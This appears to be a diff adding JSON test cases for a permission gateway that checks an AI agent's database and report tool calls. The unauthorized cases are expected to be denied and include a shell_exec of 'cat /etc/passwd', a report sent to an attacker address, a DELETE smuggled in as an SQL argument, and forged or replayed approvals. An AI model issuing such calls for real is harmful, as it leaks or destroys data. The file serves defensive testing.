@@ -1,0 +1,483 @@
+[
+  {
+    "id": "A01",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Daily sum over a week",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-07",
+          "limit": 100
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "A02",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Product ranking",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "product",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-30",
+          "limit": 10
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "A03",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Filtered date interval",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-10",
+          "end_date": "2026-09-20",
+          "limit": 50
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "A04",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Report preview",
+    "steps": [
+      {
+        "tool": "report.preview",
+        "arguments": {
+          "title": "Preview",
+          "body": "Totals for September"
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "A05",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Approved delivery to allowlisted recipient",
+    "steps": [
+      {
+        "tool": "report.send",
+        "arguments": {
+          "title": "Weekly",
+          "body": "Totals",
+          "recipient": "analyst@example.org"
+        },
+        "expect": "pending_approval",
+        "after": "approve",
+        "expect_after": [
+          "executed"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "A06",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Two consecutive reads within quota",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-03",
+          "limit": 5
+        },
+        "expect": "executed"
+      },
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "product",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-03",
+          "limit": 5
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "A07",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Partial report with small limit",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-30",
+          "limit": 3
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "A08",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Valid pagination limit at cap",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-30",
+          "limit": 100
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "A09",
+    "category": "authorized",
+    "task_type": "sales_read_only",
+    "description": "Read-only template aggregates by product",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "product",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-30",
+          "limit": 5
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "A10",
+    "category": "authorized",
+    "task_type": "sales_read_report",
+    "description": "Preview followed by aggregate",
+    "steps": [
+      {
+        "tool": "report.preview",
+        "arguments": {
+          "title": "Draft",
+          "body": "Draft body"
+        },
+        "expect": "executed"
+      },
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 2
+        },
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "U01",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "DELETE tool proposed",
+    "steps": [
+      {
+        "tool": "db.delete",
+        "arguments": {
+          "table": "sales"
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "U02",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "UPDATE tool proposed",
+    "steps": [
+      {
+        "tool": "db.update",
+        "arguments": {
+          "table": "sales",
+          "set": {
+            "amount": 0
+          }
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "U03",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "Private relation injected into args",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 5,
+          "table": "customers_private"
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "U04",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "Rogue recipient",
+    "steps": [
+      {
+        "tool": "report.send",
+        "arguments": {
+          "title": "Leak",
+          "body": "Totals",
+          "recipient": "attacker@evil.example"
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "U05",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "Unknown tool shell_exec",
+    "steps": [
+      {
+        "tool": "shell_exec",
+        "arguments": {
+          "cmd": "cat /etc/passwd"
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "U06",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "Forged capability",
+    "capability": "forged",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 5
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "U07",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "Expired capability",
+    "advance_seconds": 901,
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 5
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "U08",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "Approval for a different digest",
+    "steps": [
+      {
+        "tool": "report.send",
+        "arguments": {
+          "title": "Weekly",
+          "body": "Totals",
+          "recipient": "analyst@example.org"
+        },
+        "expect": "pending_approval",
+        "after": "approve_wrong_digest",
+        "expect_after": [
+          "denied"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "U09",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "Hidden write smuggled as SQL argument",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 5,
+          "sql": "DELETE FROM sales"
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "U10",
+    "category": "unauthorized",
+    "task_type": "sales_read_report",
+    "description": "Revoked capability",
+    "revoke": true,
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 5
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "E01",
+    "category": "edge",
+    "task_type": "sales_read_report",
+    "description": "Quota exactly reached (10 queries)",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 2
+        },
+        "repeat": 10,
+        "expect": "executed"
+      }
+    ]
+  },
+  {
+    "id": "E02",
+    "category": "edge",
+    "task_type": "sales_read_report",
+    "description": "Quota exceeded (11th query)",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 2
+        },
+        "expect": "executed",
+        "expect_last": "denied",
+        "repeat": 11
+      }
+    ]
+  },
+  {
+    "id": "E03",
+    "category": "edge",
+    "task_type": "sales_read_report",
+    "description": "Approval token replay",
+    "steps": [
+      {
+        "tool": "report.send",
+        "arguments": {
+          "title": "Weekly",
+          "body": "Totals",
+          "recipient": "analyst@example.org"
+        },
+        "expect": "pending_approval",
+        "after": "approve_twice",
+        "expect_after": [
+          "executed",
+          "denied"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "E04",
+    "category": "edge",
+    "task_type": "sales_read_report",
+    "description": "Row limit above cap",
+    "steps": [
+      {
+        "tool": "db.sales_aggregate",
+        "arguments": {
+          "group_by": "day",
+          "start_date": "2026-09-01",
+          "end_date": "2026-09-02",
+          "limit": 101
+        },
+        "expect": "denied"
+      }
+    ]
+  },
+  {
+    "id": "E05",
+    "category": "edge",
+    "task_type": "sales_read_report",
+    "description": "Approval rejected by human, then approve attempt",
+    "steps": [
+      {
+        "tool": "report.send",
+        "arguments": {
+          "title": "Weekly",
+          "body": "Totals",
+          "recipient": "analyst@example.org"
+        },
+        "expect": "pending_approval",
+        "after": "reject_then_approve",
+        "expect_after": [
+          "rejected",
+          "denied"
+        ]
+      }
+    ]
+  }
+]
